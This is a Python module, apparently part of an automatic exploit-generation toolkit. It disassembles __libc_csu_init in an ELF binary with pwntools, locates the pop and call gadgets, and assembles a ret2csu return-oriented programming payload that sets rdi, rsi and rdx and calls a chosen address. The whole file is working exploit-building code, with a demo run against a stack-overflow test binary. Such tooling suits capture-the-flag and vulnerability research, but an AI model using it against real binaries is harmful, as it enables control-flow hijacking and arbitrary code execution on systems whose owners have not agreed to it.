"""
author : 4everdestiny
create_time : 2022.3.10
description : this is the code to generate a ret2libc_csu_init payload
input : binary path
output : the ret2libc_csu_init payload
"""

import re
import pwn
from log.log import Log
from exploit_generation.PayloadElement import PayloadElement
from exploit_generation.SinglePayload import SinglePayload

log = Log()


class CsuInitPayload:
    def __init__(self, binarypath):
        self.binarypath = binarypath
        self.haveanalyse = False
        self.elf = pwn.ELF(self.binarypath, checksec=False)
        self.PIE = self.elf.pie
        self.csu_call_gadget = 0
        self.csu_pop_gadget = 0
        self.csu_pop_regs = []
        pwn.context.arch = self.elf.arch
        pwn.context.bits = self.elf.bits
        pwn.context.endian = self.elf.endian
        self.gadget_map = {}

    def AnalyseLibcCsuInit(self):
        """
        this function is used to analyse the __libc_csu_init function
        and use it to generate ret2libc_csu_init payload
        :return: None
        """
        if self.haveanalyse:
            return True
        if "__libc_csu_init" in self.elf.symbols or True:
            if "__libc_csu_init" in self.elf.symbols:
                libc_csu_init = self.elf.symbols["__libc_csu_init"]
            elif "init" in self.elf.symbols:
                libc_csu_init = self.elf.symbols["init"]
            else:
                section_fini = None
                for section in self.elf.sections:
                    if section.name == ".fini":
                        section_fini = section
                if section_fini is None:
                    return False
                address = section_fini.header.sh_addr
                libc_csu_init = address - 0x80
                # libc_csu_init = self.elf.symbols["main"]
            code_index = self.elf.vaddr_to_offset(libc_csu_init)
            disasmdata = pwn.disasm(self.elf.data[code_index:code_index + 0x80])
            # print(disasmdata)
            disasmdatalines = disasmdata.split("\n")
            popdisasmdatalines = ""
            for i in range(len(disasmdatalines)):
                if "mov" in disasmdatalines[i] \
                        and "mov" in disasmdatalines[i + 1] \
                        and "mov" in disasmdatalines[i + 2] \
                        and "call" in disasmdatalines[i + 3]:
                    data = re.findall("[0-9a-f]+", disasmdatalines[i])[0]
                    index = int(data, 16)
                    code_index += int(data, 16)
                    self.csu_call_gadget = libc_csu_init + index
                    disasmdatalines = disasmdatalines[i:]
                    break
            log.info("find call_gadget: {call_gadget_addr}".format(call_gadget_addr=hex(self.csu_call_gadget)))
            for i in range(len(disasmdatalines)):
                if "pop" in disasmdatalines[i] \
                        and "pop" in disasmdatalines[i + 1] \
                        and "pop" in disasmdatalines[i + 2]:
                    data = re.findall("[0-9a-f]+", disasmdatalines[i])[0]
                    index = int(data, 16)
                    code_index += int(data, 16)
                    self.csu_pop_gadget = libc_csu_init + index
                    popdisasmdatalines = disasmdatalines[i:]
                    calldisasmdatalines = disasmdatalines[:i]
                    break
            log.info("find pop_gadget: {call_gadget_addr}".format(call_gadget_addr=hex(self.csu_pop_gadget)))
            for i in range(0, len(popdisasmdatalines)):
                code = popdisasmdatalines[i]
                if "ret" in code:
                    break
                reg = re.findall("r[a-z0-9]+", code)[0]
                self.csu_pop_regs.append(reg)
            # print(self.csu_pop_regs)
            for i in range(0, len(calldisasmdatalines)):
                code = calldisasmdatalines[i]
                regs = re.findall("[r|e|c][a-z0-9]{2}", code)
                # print(regs)
                if len(regs) == 2:
                    # mov rdx, r15
                    self.gadget_map[regs[-1]] = regs[0].replace("e", "r")
                elif len(regs) == 1:
                    # add rbx,1
                    self.gadget_map[regs[0]] = 0
                elif len(regs) == 3:
                    # call [r12 + rbx * 8]
                    # cmp rbp, rbx
                    if regs[0] == "cal":
                        # ['cal', 'r12', 'rbx']
                        self.gadget_map[regs[1]] = "call_address"
                    elif regs[0] == "cmp":
                        # ['cmp', 'rbp', 'rbx']
                        if regs[1] == "rbp":
                            self.gadget_map[regs[1]] = 1
                        elif regs[2] == "rbp":
                            self.gadget_map[regs[2]] = 1
                        else:
                            return False
                    else:
                        log.Exception("some instructions error, check it")
                        return False
            for i in range(len(self.csu_pop_regs)):
                self.csu_pop_regs[i] = self.gadget_map[self.csu_pop_regs[i]]
            self.haveanalyse = True
            return True
        else:
            # nearly not enter this function
            log.Exception("__libc_csu_init not found, error binary?")
            return False

    def GetCsuPayload(self, rdi=PayloadElement(), rsi=PayloadElement()
                      , rdx=PayloadElement(), call_address=PayloadElement()
                      , fullpayload=False):
        """
        this is the fucntion to generate the ret2libc_csu_init payload
        remember to give the correct binary path
        and the call_address is the got table of a function
        :param rdi: the first parameter of csu gadgets
        :param rsi: the second parameter of csu gadgets
        :param rdx: the third parameter of csu gadgets
        :param call_address: the target address of call
        :param fullpayload: if True, add p64(0) * 7 in the payload, if False, not add
        :return: the payload of ret2libc_csu_init
        """
        if rdi.adjustinfo == "elf_base":
            log.Exception("csu init payload rdi is edi, maybe high value cannot write")
            #return None
        self.AnalyseLibcCsuInit()
        map = {"rdi": rdi, "rsi": rsi, "rdx": rdx, "call_address": call_address}
        final_payload = []
        final_payload.append(PayloadElement(
            datavalue=self.csu_pop_gadget, adjustinfo="elf_base",
            datatype="int64"
        ))
        for i in range(len(self.csu_pop_regs)):
            if type(self.csu_pop_regs[i]) == int:
                final_payload.append(PayloadElement(
                    datavalue=self.csu_pop_regs[i], adjustinfo=None,
                    datatype="int64"
                ))
            else:
                final_payload.append(map[self.csu_pop_regs[i]])
        final_payload.append(PayloadElement(
            datavalue=self.csu_call_gadget, adjustinfo="elf_base",
            datatype="int64"
        ))
        if fullpayload:
            final_payload.append(PayloadElement(
                datavalue=pwn.p64(0) * 7, adjustinfo=None,
                datatype="bytes"))
        else:
            # final_payload += p64(0)
            pass
        return final_payload


if __name__ == '__main__':
    binarypath = "../binaries/stack_overflow/dynamic/test1/dynamic_test1"
    CsuInitPayload = CsuInitPayload(binarypath)
    payload = CsuInitPayload.GetCsuPayload()
    singel_payload = SinglePayload(
        content=payload, length=0x100,
        prefixlength=0
    )
    print(singel_payload)